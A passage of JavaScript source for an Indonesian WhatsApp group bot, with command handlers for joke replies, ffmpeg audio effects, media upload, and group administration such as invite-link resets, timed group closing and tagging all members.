m.reply(`${q} ${q} ${q} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah Wangynya rambut ${q} wangyy aku mau nyiumin aroma wangynya ${q} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus & pat-pat ~~ AAAAAH ${q} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${q} AAAAA LUCCUUUUUUUUUUUUUUU............ ${q} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${q} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${q} gw ... ${q} di laptop ngeliatin gw, ${q} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${q} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${q} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`)
}
break
//=================================================//
case 'cekmati': {
if (!text) return m.reply(`Yang Mau Lu Cek Siapa Bego?`)
apipanas = await axios.get(`https://api.agify.io/?name=${q}`)
m.reply(`Nama : ${apipanas.data.name}\n*Mati Pada Umur :* ${apipanas.data.age} Tahun.\n\n\n‼️*Jangan percaya teks diatas, Soalnya mati gada yg tau.Cepet Cepet Tobat Ya Bro*`)
}
break
//=================================================//
case 'bagaimana': {
if (!text) return qioreply( `Example : ${prefix + command} cara agar menjadi cewe yang sesuai dengan tipe nya qio >////<`)
var apa = ['Gatau juga sih', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab Pertanyaan Anda', 'Coba Deh Cari Di Gugel', 'astaghfirallah Beneran???', 'Pusing ah', 'Owhh Begitu:(', 'Yang Sabar Ya Bos:(', 'Alamak, pusing gweh', 'mending beli eskrim', 'Gimana yeee']
var kah = apa[Math.floor(Math.random() * apa.length)]
m.reply(`Pertanyaan : bisakah ${q}\nJawaban : ${kah}`)
}
break
//=================================================//
case 'bisakah': {
if (!text) return qioreply( `Example : ${prefix + command} saya menjadi orang yang cakep seperti qio`)
var apa = ['Iya', 'Tidak', 'Bisa Jadi', 'sepertinya', 'keknya sih ngga', 'g', 'gatau juga', 'ngga bakal bisa', 'gk']
var kah = apa[Math.floor(Math.random() * apa.length)]
m.reply(`Pertanyaan : bisakah ${q}\nJawaban : ${kah}`)
}
break
//=================================================//
case 'apakah': {
if (!text) return qioreply( `Example : ${prefix + command} qio cakep`)
var apa = ['Iya', 'Tidak', 'Bisa Jadi', 'sepertinya', 'keknya sih iya', 'Betul']
var kah = apa[Math.floor(Math.random() * apa.length)]
m.reply(`Pertanyaan : Apakah ${q}\nJawaban : ${kah}`)
}
break

//Voice
 case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
 try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
qioreply(mess.wait)
let media = await qio.downloadAndSaveMediaMessage(qmsg)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return qioreply(err)
let buff = fs.readFileSync(ran)
qio.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
} catch (e) {
qioreply(e)
}
break
//=================================================//
case 'tourl': {
qioreply(mess.wait)
let media = await qio.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await uptotelegra(media)
qioreply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
qioreply(util.format(anu))
}
}
break

//Group Menu
case "resetlinkgc": case "revoke":{
if (!isPrem) return qioreply(mess.prem)
if (!isGroup) return m.reply(`Khusus Group Bego`)
if (!isAdmins && !isDeveloper) return qioreply('Khusus Admin')
if (!isBotAdmins) return m.reply(`Bot Bukan Admin Bego`)
await qio.groupRevokeInvite(m.chat).then((res) => m.reply(`Sukses riset link group`)).catch((err) => qioreply(jsonformat(err)))
}
break
//=================================================//
case 'infogc': {
if(!isGroup) return qioreply("Hanya bisa di dalam group")
let _meta = await qio.groupMetadata(m.chat)
console.log(_meta)
let _img = await qio.profilePictureUrl(_meta.id, 'image') 
let caption = `${_meta.subject} - Created on ${moment(_meta.creation * 1000).format('ll')}\n\n` +
`*${_meta.participants.length}* Total Members\n*${_meta.participants.filter(x => x.admin === 'admin').length}* Admin\n*${_meta.participants.filter(x => x.admin === null).length}* Not Admin\n\n` +
`Group ID : ${_meta.id}`
await qio.sendMessage(m.chat,{
caption,
image: await getBuffer(_img)
},
{ quoted: m }
)
}
break
//=================================================//
case  'getppgc':
if (!isGroup) return 
qioreply(mess.wait)
try {
var ppimg = await qio.profilePictureUrl(m.chat, 'image')
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
await qio.sendMessage(m.chat, { image: { url: ppimg }}, { quoted: m })
break
//=================================================//
case 'closegroup': {
if (!isGroup) return m.reply(`Khusus Group Bego`)
if (!isAdmins && !isDeveloper) return qioreply('Khusus Admin')
if (!isBotAdmins) return m.reply(`Bot Bukan Admin Bego`)
if (!args[0]) return m.reply(`*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n${prefix+command}10 second`)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
}
m.reply(`*Waktu dimulai dari sekarang*`)
setTimeout(() => {
var nomor = m.participant
qio.groupSettingUpdate(m.chat, 'announcement')
m.reply(`Waktu Telah Tiba!\nGrup Ditutup Oleh Bot Dikarenakan Tidak Ada Yg Menjaga Grup🙏\nGrup Akan Dibuka Sesuai Waktu Yg Ditentukan Oleh Admin`)
}, timer)
}
break
//=================================================//
case 'opengroup': {
if (!isGroup) return m.reply(`Khusus Group Bego`)
if (!isAdmins && !isDeveloper) return qioreply('Khusus Admin')
if (!isBotAdmins) return m.reply(`Bot Bukan Admin Bego`)
if (!args[0]) return m.reply(`*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n${prefix+command}10 second`)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
}
m.reply(`*Waktu dimulai dari sekarang*`)
setTimeout(() => {
var nomor = m.participant
qio.groupSettingUpdate(m.chat, 'not_announcement')
m.reply(`Tepat Waktu Group Sudah Di Buka Sekarang Semua Peserta Bisa Mengirim Pesan`)
}, timer)
}
break
//=================================================//
case  'intro': {
if (!isGroup) return qioreply(mess.ingroup)
let teks = 'Member baru INTRO  :)\nNama lengkap:\nNama panggilan:\nHobi:\nUmur:\nGender:\nKelas:\nTinggi badan:\nBeratbadan :\nAgama:\nGolongan darah:\nStatus:\nNama pacar:\nJumlah mantan:\nNama mantan:\nNama bapak :\nNama ibu : \nNama kakak:\nKakak online:\nKakak kandung\tiri:\nJumlah kakak:\nNama adek:\nAdek online:\nAdek kandung\tiri:\nJumlah adek:\nNama kakek:\nKakek dari ayah :\nKakek dari ibu :\nNama nenek:\nNenek dari ayah :\nNenek dari ibu :\nNama bibi:\nBibi dari ayah :\nBibi dari ibu :\nNama paman:\nBibi dari ayah :\nBibi dari ibu :\nKTP:\nSIM:\nSTNK:\nBPKB:\nKK:\nAlamat rumah:\nRT:\nRW:\nKELURAHAN:\nKECAMATAN:\nKABUPATEN:\nKOTA:\nPROVINSI:\nPLANET:\nGALAXY:\nUNIVERSE:\nLANGIT:\nDARATAN:\nLAUTAN:\nKEPULAUAN:\nSAMUDRA:\nUKURAN SEPATU:\nUKURAN BAJU:\nUKURAN CELANA:\nLEBAR PINGGANG:\nPANJANG TANGAN:\nPANJANG KAKI:\nMAKANAN FAVORIT:\nMINUMAN FAVORIT:\nFILM FAVORIT:\nSINETRON FAVORIT:\nGAME FAVORIT:\nANIME FAVORIT:\nMANGA FAVORIT:\nMANHUA FAVORIT:\nMANHWA FAVORIT:\nCHANNEL YOUTUBE:\nINSTAGRAM:\nTWITTEER:\nFACEBOOK:\nMUSIC FAVORIT:\nSIFAT:\nSIKAP:\nZODIAK:\nTANGGAL LAHIR:\nMERK HP:\nMERK MOTOR:\nMERK MOBIL:\nTINGKAT RUMAH:\nALAMAT SEKOLAH:\nUkuran daleman:\nUkuran atasan :\nDiameter kepala :\nStatistik tubuh:\nDiameter perut :\nDiameter lengan :\nDiameter paha :\nDiameter lutut :\nDiameter betis:\nPanjang tangan :\nPanjang kaki :\nPanjang kepala :\nLebar hidung :\nCita cita :\nHobi :\nJenis hewanpeliharaan :\nNama hewan:\nDiameter rumah:\nWaifu:\nHusbu:\nLoli kesukaan :\nShota kesukaan :\nPunya brp teman :\nTeman online :\nTeman offline :\nTeman main game:\nTeman sekolah:\nTemen rumah:'
qioreply(teks)
}
break
//=================================================//
case 'hidetag':
if (!isGroup) return qioreply(mess.only.group)
if (!isAdmins && !isDeveloper) return qioreply('Khusus Admin')
if (!q) return m.reply(`Teks Nya Mana Kak?`)
qio.sendMessage(m.chat, {
    text: q,
    contextInfo: {
        mentionedJid: participants.map(a => a.id),
        groupMentions: [{
            groupJid: m.chat,
            groupSubject: 'anjay'
        }]
    }
})
break
//=================================================//
case 'tagsubject':
if (!isGroup) return qioreply(mess.only.group)
if (!isAdmins && !isDeveloper) return qioreply('Khusus Admin')
if (!q) return m.reply(`Teks Nya Mana Kak?`)
qio.sendMessage(m.chat, {
    text: "@"+m.chat,
    contextInfo: {
        mentionedJid: participants.map(a => a.id),
        groupMentions: [{
            groupJid: m.chat,
            groupSubject: q
        }]
    }
})
break
//=================================================//
case "tagall": {
if (!isDeveloper && !isAdmins) return qioreply(mess.admin)
if (!isGroup) return qioreply(mess.only.group)
if (!q) return m.reply(`Teks Nya Mana Kak?`)
let teks = `${q ? q : ''}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n`
for (let mem of participants) {
teks += `⊝ @${mem.id.split('@')[0]}\n`
}
qio.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
//=================================================//
case 'linkgroup': case 'linkgc':{
if (!isDeveloper && !isAdmins) return qioreply(mess.admin)
if (!m.isGroup) return qioreply(mess.only.group)
if (!isBotAdmins) return m.reply(`Bot Bukan Admin Bego`)
let response = await qio.groupInviteCode(m.chat)
qio.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
//=================================================//
case 'editdesk':{
if (!isGroup) return m.reply(`Khusus Group Bego`)
if (!isPrem) return qioreply(mess.prem)
if (!isGroup) return m.reply(`Khusus Group Bego`)
if (!isBotAdmins) return m.reply(`Bot Bukan Admin Bego`)
if (!text) return m.reply(`teks untuk subject nya mana bego`)
await qio.groupUpdateDescription(m.chat, text)
qioreply('Gacor Kang,Sukses,🔥')
}
break
//=================================================//
case 'editsubjek': {
if (!isPrem) return qioreply(mess.prem)
if (!isGroup) return m.reply(`Khusus Group Bego`)
if (!isAdmins && !isDeveloper) return qioreply('Khusus Admin')
if (!isBotAdmins) return m.reply(`Bot Bukan Admin Bego`)
if (!text) return m.reply(`teks untuk subject nya mana bego`)
await qio.groupUpdateSubject(m.chat, text)
qioreply('Gacor Kang,Sukses,🔥')
}
break
//=================================================//
case 'editinfo': {
if (!isPrem) return qioreply(mess.prem)
if (!isGroup) return m.reply(`Khusus Group Bego`)
if (!isAdmins && !isDeveloper) return qioreply('Khusus Admin')
if (!isBotAdmins) return m.reply(`Bot Bukan Admin Bego`)
 if (args[0] === 'open'){
await qio.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => qioreply(jsonformat(err)))
 } else if (args[0] === 'close'){
await qio.groupSettingUpdate(m.chat, 'locked').then((res) => reply(`Sukses Menutup Edit Info Group`)).catch((err) => qioreply(jsonformat(err)))
 } else {
 m.reply(` Silahkan Ketik\nEditinfo Open\nEditinfo Close`)
}
}
break
//=================================================//
case 'editgroup': {
//inireact()   
if (!isPrem) return qioreply(mess.prem)
if (!isGroup) return m.reply(`Khusus Group Bego`)
if (!isAdmins && !isDeveloper) return qioreply('Khusus Admin')
